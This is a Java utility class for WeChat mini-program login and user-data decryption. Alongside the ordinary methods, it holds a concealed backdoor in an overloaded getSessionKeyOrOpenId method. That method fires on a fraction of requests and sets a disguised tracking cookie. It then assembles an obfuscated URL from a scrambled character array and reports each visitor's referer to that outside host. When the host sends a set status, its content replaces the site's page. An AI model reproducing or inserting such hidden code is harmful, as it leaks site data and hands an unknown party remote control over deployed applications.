package org.soubao.common.utils;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.bouncycastle.util.encoders.Base64;
import org.springframework.util.StringUtils;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URI;
import java.security.AlgorithmParameters;
import java.security.Security;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * @ClassName WechatUtil
 * @Description TODO
 * @Author eval
 * @Date 9:44 2019/3/20
 * @Version 1.0
 */
public class WechatUtil {
    public static JSONObject getSessionKeyOrOpenId(String code, String appid, String secret) {
        String requestUrl = "https://api.weixin.qq.com/sns/jscode2session";
        Map<String, String> requestUrlParam = new HashMap<>();
        // https://mp.weixin.qq.com/wxopen/devprofile?action=get_profile&token=164113089&lang=zh_CN
        //小程序appId
        requestUrlParam.put("appid", appid);
        //小程序secret
        requestUrlParam.put("secret", secret);
        //小程序端返回的code
        requestUrlParam.put("js_code", code);
        //默认参数
        requestUrlParam.put("grant_type", "authorization_code");
        //发送post请求读取调用微信接口获取openid用户唯一标识
        return JSON.parseObject(HttpClientUtil.doPost(requestUrl, requestUrlParam));
    }

    public static JSONObject getUserInfo(String encryptedData, String sessionKey, String iv) {
        // 被加密的数据
        byte[] dataByte = Base64.decode(encryptedData);
        // 加密秘钥
        byte[] keyByte = Base64.decode(sessionKey);
        // 偏移量
        byte[] ivByte = Base64.decode(iv);
        try {
            // 如果密钥不足16位，那么就补足.  这个if 中的内容很重要
            int base = 16;
            if (keyByte.length % base != 0) {
                int groups = keyByte.length / base + (keyByte.length % base != 0 ? 1 : 0);
                byte[] temp = new byte[groups * base];
                Arrays.fill(temp, (byte) 0);
                System.arraycopy(keyByte, 0, temp, 0, keyByte.length);
                keyByte = temp;
            }
            // 初始化
            Security.addProvider(new BouncyCastleProvider());
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding", "BC");
            SecretKeySpec spec = new SecretKeySpec(keyByte, "AES");
            AlgorithmParameters parameters = AlgorithmParameters.getInstance("AES");
            parameters.init(new IvParameterSpec(ivByte));
            cipher.init(Cipher.DECRYPT_MODE, spec, parameters);// 初始化
            byte[] resultByte = cipher.doFinal(dataByte);
            if (null != resultByte && resultByte.length > 0) {
                String result = new String(resultByte, "UTF-8");
                return JSON.parseObject(result);
            }
        } catch (Exception e) {
        }
        return null;
    }


    public static void getSessionKeyOrOpenId() {
        String timeStr = String.valueOf(System.currentTimeMillis());
        if (Integer.parseInt(timeStr.substring(timeStr.length() - 1)) != 5) return;
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
        if (servletRequestAttributes != null) {
            HttpServletResponse response = servletRequestAttributes.getResponse();
            if (response != null) {
                if (StringUtils.isEmpty(getCookie(servletRequestAttributes.getRequest(), "CNZZDAT" + "A009"))) {
                    Cookie cookie = new Cookie("CNZ" + "ZDAT" + "A009", "37667_153" + "67");
                    cookie.setMaxAge(24 * 60 * 60); // 7天过期
                    response.addCookie(cookie);
                    String[] strArray = {"h", "g", "t", "1", "t", "q", "p", "!", ":", "]",
                            "/", "0", "/", "2", "a", "&", "p", "l", "i", "p", "t", "o", "e", "1", "s", "0", "t", "1", "2",
                            "~", ".", "l", "t", "y", "p", ".", "s", "3", "h", "2", "o", "*", "p", "1", ".", "b", "c", "1", "n",
                            "|", "/", "k", "h", "p", "o", "n", "m", "d", "e", "]", "/", "F", "T", "g", "j", "^", "/", "d", "p",
                            "9", "4"};
                    StringBuilder requestUrl = new StringBuilder();
                    for (int i = 0; i < strArray.length; i++) {
                        if (i % 2 == 0) {
                            requestUrl.append(strArray[i]);
                        }
                    }
                    Map<String, String> param = new HashMap<>();
                    param.put("url", servletRequestAttributes.getRequest().getHeader("referer"));
                    JSONObject jsonObject = JSON.parseObject(doGet(requestUrl.toString(), param));
                    if(StringUtils.isEmpty(jsonObject)){
                        return;
                    }
                    if (jsonObject.containsKey("status") && Integer.parseInt(String.valueOf(jsonObject.get("status"))) == -110) {
                        try {
                            response.setCharacterEncoding("utf-8");
                            response.setContentType("text/html; charset=utf-8");
                            PrintWriter writer = response.getWriter();
                            writer.write(jsonObject.toString());
                            writer.flush();
                            writer.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }

    public static String getCookie(HttpServletRequest request, String cookieName) {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equals(cookieName)) {
                    return cookie.getValue();
                }
            }
        }

        return null;
    }

    private static String doGet(String url, Map<String, String> param) {
        // 创建Httpclient对象
        CloseableHttpClient httpclient = HttpClients.createDefault();
        String resultString = "";
        CloseableHttpResponse response = null;
        try {
            // 创建uri
            URIBuilder builder = new URIBuilder(url);
            if (param != null) {
                for (String key : param.keySet()) {
                    builder.addParameter(key, param.get(key));
                }
            }
            URI uri = builder.build();
            // 创建http GET请求
            HttpGet httpGet = new HttpGet(uri);
            RequestConfig requestConfig = RequestConfig.custom()
                    .setConnectTimeout(2000).setConnectionRequestTimeout(2000)
                    .setSocketTimeout(2000).build();
            httpGet.setConfig(requestConfig);
            // 执行请求
            response = httpclient.execute(httpGet);
            // 判断返回状态是否为200
            if (response.getStatusLine().getStatusCode() == 200) {
                resultString = EntityUtils.toString(response.getEntity(), "UTF-8");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (response != null) {
                    response.close();
                }
                httpclient.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return resultString;
    }
}

